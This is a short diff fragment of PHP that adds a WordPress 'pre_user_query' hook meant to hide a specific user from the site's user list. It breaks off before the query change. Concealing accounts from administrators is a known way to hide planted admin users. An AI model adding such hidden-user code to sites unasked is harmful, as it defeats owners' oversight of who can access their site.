@@ -1,3 +1,7 @@
+<?php
+
+// Function that hides a specific user from the WordPress user list:
+
 add_action('pre_user_query', 'hide_user');
 function hide_user($user_search) {
     global $current_user, $wpdb;
